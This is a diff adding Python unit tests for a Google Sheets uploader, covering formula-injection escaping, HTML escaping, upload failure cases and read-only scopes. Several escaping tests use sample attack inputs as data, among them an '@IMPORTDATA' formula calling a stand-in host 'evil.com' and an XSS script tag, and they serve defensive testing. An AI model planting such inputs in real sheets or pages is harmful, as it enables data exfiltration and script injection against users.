@@ -462,5 +462,297 @@ class TestGoogleSheetsInputValidation(unittest.TestCase):
             self.skipTest("Google Sheets dependencies not installed")
 
 
+class TestEscapeForSheets(unittest.TestCase):
+    """Test formula injection prevention"""
+
+    def test_escape_formula_injection_equals(self):
+        """Test that formulas starting with = are escaped"""
+        from google_sheets_integration import escape_for_sheets
+
+        malicious = "=1+1"
+        result = escape_for_sheets(malicious)
+        self.assertEqual(result, "'=1+1")
+
+    def test_escape_formula_injection_plus(self):
+        """Test that formulas starting with + are escaped"""
+        from google_sheets_integration import escape_for_sheets
+
+        malicious = "+A1+A2"
+        result = escape_for_sheets(malicious)
+        self.assertEqual(result, "'+A1+A2")
+
+    def test_escape_formula_injection_minus(self):
+        """Test that formulas starting with - are escaped"""
+        from google_sheets_integration import escape_for_sheets
+
+        malicious = "-A1"
+        result = escape_for_sheets(malicious)
+        self.assertEqual(result, "'-A1")
+
+    def test_escape_formula_injection_at(self):
+        """Test that formulas starting with @ are escaped"""
+        from google_sheets_integration import escape_for_sheets
+
+        malicious = "@IMPORTDATA('http://evil.com')"
+        result = escape_for_sheets(malicious)
+        self.assertEqual(result, "'@IMPORTDATA('http://evil.com')")
+
+    def test_escape_formula_injection_pipe(self):
+        """Test that formulas starting with | are escaped"""
+        from google_sheets_integration import escape_for_sheets
+
+        malicious = "|evil"
+        result = escape_for_sheets(malicious)
+        self.assertEqual(result, "'|evil")
+
+    def test_escape_html_characters(self):
+        """Test that HTML/XML characters are escaped"""
+        from google_sheets_integration import escape_for_sheets
+
+        text = "Text with <script>alert('xss')</script>"
+        result = escape_for_sheets(text)
+        self.assertIn("&lt;", result)
+        self.assertIn("&gt;", result)
+        self.assertEqual(result, "Text with &lt;script&gt;alert('xss')&lt;/script&gt;")
+
+    def test_escape_empty_string(self):
+        """Test that empty strings are handled"""
+        from google_sheets_integration import escape_for_sheets
+
+        result = escape_for_sheets("")
+        self.assertEqual(result, "")
+
+    def test_escape_none(self):
+        """Test that None is handled"""
+        from google_sheets_integration import escape_for_sheets
+
+        result = escape_for_sheets(None)
+        self.assertEqual(result, "")
+
+    def test_escape_normal_text(self):
+        """Test that normal text passes through"""
+        from google_sheets_integration import escape_for_sheets
+
+        text = "Normal project notes"
+        result = escape_for_sheets(text)
+        self.assertEqual(result, text)
+
+
+class TestGoogleSheetsUploadSession(unittest.TestCase):
+    """Test actual upload_session method"""
+
+    def setUp(self):
+        """Set up test fixtures"""
+        self.file_manager = TestFileManager()
+        self.addCleanup(self.file_manager.cleanup)
+
+    @patch("google_sheets_integration.os.path.exists")
+    def test_upload_disabled_returns_false(self, mock_exists):
+        """Test that upload returns False when Google Sheets disabled"""
+        try:
+            from google_sheets_integration import GoogleSheetsUploader
+
+            settings = TestDataGenerator.create_settings_data()
+            settings["google_sheets"] = {"enabled": False}
+
+            test_file = "test_upload_disabled.json"
+            self.file_manager.create_test_file(test_file, settings)
+
+            uploader = GoogleSheetsUploader(test_file)
+            session_data = TestDataGenerator.create_session_data()
+            session = list(session_data.values())[0]
+
+            result = uploader.upload_session(session, "test_session_123")
+            self.assertFalse(result)
+        except ImportError:
+            self.skipTest("Google Sheets dependencies not installed")
+
+    @patch("google_sheets_integration.os.path.exists")
+    def test_upload_no_spreadsheet_id_returns_false(self, mock_exists):
+        """Test that upload returns False without spreadsheet ID"""
+        try:
+            from google_sheets_integration import GoogleSheetsUploader
+
+            settings = TestDataGenerator.create_settings_data()
+            settings["google_sheets"] = {
+                "enabled": True,
+                "spreadsheet_id": "",  # No ID
+            }
+
+            test_file = "test_upload_no_id.json"
+            self.file_manager.create_test_file(test_file, settings)
+
+            uploader = GoogleSheetsUploader(test_file)
+            session_data = TestDataGenerator.create_session_data()
+            session = list(session_data.values())[0]
+
+            result = uploader.upload_session(session, "test_session_123")
+            self.assertFalse(result)
+        except ImportError:
+            self.skipTest("Google Sheets dependencies not installed")
+
+    def test_upload_session_data_format(self):
+        """Test that session data is formatted correctly for upload"""
+        try:
+            from google_sheets_integration import GoogleSheetsUploader
+
+            # Create uploader with test settings
+            settings = TestDataGenerator.create_settings_data()
+            settings["google_sheets"] = {
+                "enabled": True,
+                "spreadsheet_id": "test_123",
+                "sheet_name": "Sessions",
+            }
+
+            test_file = "test_upload_format.json"
+            self.file_manager.create_test_file(test_file, settings)
+
+            uploader = GoogleSheetsUploader(test_file)
+
+            # Without authentication, service is None
+            self.assertIsNone(uploader.service)
+
+            # Create test session with known data
+            session = {
+                "date": "2024-01-20",
+                "start_time": "10:00:00",
+                "end_time": "10:30:00",
+                "sphere": "Work",
+                "project": "Testing",
+                "total_duration": 1800,  # 30 min in seconds
+                "active_duration": 1500,  # 25 min
+                "break_duration": 300,  # 5 min
+                "actions": [{"time": "10:00:00"}],
+                "break_actions": [{"actions": [{"time": "10:25:00"}]}],
+                "notes": "Test notes",
+            }
+
+            # Upload will fail without service, but that's expected
+            # This test verifies the data structure is correct
+            result = uploader.upload_session(session, "session_123")
+
+            # Should return False since we can't authenticate
+            self.assertFalse(result)
+
+            # Verify session has all required fields
+            self.assertIn("date", session)
+            self.assertIn("start_time", session)
+            self.assertIn("sphere", session)
+            self.assertIn("project", session)
+            self.assertIn("total_duration", session)
+        except ImportError:
+            self.skipTest("Google Sheets dependencies not installed")
+
+
+class TestGoogleSheetsTestConnection(unittest.TestCase):
+    """Test connection testing functionality"""
+
+    def setUp(self):
+        """Set up test fixtures"""
+        self.file_manager = TestFileManager()
+        self.addCleanup(self.file_manager.cleanup)
+
+    @patch("google_sheets_integration.os.path.exists")
+    def test_connection_no_spreadsheet_id(self, mock_exists):
+        """Test connection test fails without spreadsheet ID"""
+        try:
+            from google_sheets_integration import GoogleSheetsUploader
+
+            settings = TestDataGenerator.create_settings_data()
+            settings["google_sheets"] = {
+                "enabled": True,
+                "spreadsheet_id": "",
+            }
+
+            test_file = "test_connection_no_id.json"
+            self.file_manager.create_test_file(test_file, settings)
+
+            uploader = GoogleSheetsUploader(test_file)
+            success, message = uploader.test_connection()
+
+            self.assertFalse(success)
+            self.assertIn("No spreadsheet ID", message)
+        except ImportError:
+            self.skipTest("Google Sheets dependencies not installed")
+
+    def test_connection_success(self):
+        """Test successful connection message format"""
+        try:
+            from google_sheets_integration import GoogleSheetsUploader
+
+            settings = TestDataGenerator.create_settings_data()
+            settings["google_sheets"] = {
+                "enabled": True,
+                "spreadsheet_id": "test_123",
+            }
+
+            test_file = "test_connection_success.json"
+            self.file_manager.create_test_file(test_file, settings)
+
+            uploader = GoogleSheetsUploader(test_file)
+            success, message = uploader.test_connection()
+
+            # Without authentication, should fail
+            self.assertFalse(success)
+            # Message should indicate authentication failure
+            self.assertIn("Authentication", message)
+        except ImportError:
+            self.skipTest("Google Sheets dependencies not installed")
+
+
+class TestGoogleSheetsReadOnly(unittest.TestCase):
+    """Test read-only mode"""
+
+    def setUp(self):
+        """Set up test fixtures"""
+        self.file_manager = TestFileManager()
+        self.addCleanup(self.file_manager.cleanup)
+
+    @patch("google_sheets_integration.os.path.exists")
+    def test_read_only_mode_uses_readonly_scopes(self, mock_exists):
+        """Test that read-only mode uses readonly scopes"""
+        try:
+            from google_sheets_integration import (
+                GoogleSheetsUploader,
+                SCOPES_READONLY,
+            )
+
+            settings = TestDataGenerator.create_settings_data()
+            settings["google_sheets"] = {
+                "enabled": True,
+                "spreadsheet_id": "test_123",
+            }
+
+            test_file = "test_readonly.json"
+            self.file_manager.create_test_file(test_file, settings)
+
+            uploader = GoogleSheetsUploader(test_file, read_only=True)
+            self.assertEqual(uploader.scopes, SCOPES_READONLY)
+            self.assertTrue(uploader.read_only)
+        except ImportError:
+            self.skipTest("Google Sheets dependencies not installed")
+
+    @patch("google_sheets_integration.os.path.exists")
+    def test_full_mode_uses_full_scopes(self, mock_exists):
+        """Test that full mode uses full scopes"""
+        try:
+            from google_sheets_integration import GoogleSheetsUploader, SCOPES_FULL
+
+            settings = TestDataGenerator.create_settings_data()
+            settings["google_sheets"] = {
+                "enabled": True,
+                "spreadsheet_id": "test_123",
+            }
+
+            test_file = "test_full.json"
+            self.file_manager.create_test_file(test_file, settings)
+
+            uploader = GoogleSheetsUploader(test_file, read_only=False)
+            self.assertEqual(uploader.scopes, SCOPES_FULL)
+            self.assertFalse(uploader.read_only)
+        except ImportError:
+            self.skipTest("Google Sheets dependencies not installed")
+
+
 if __name__ == "__main__":
     unittest.main()
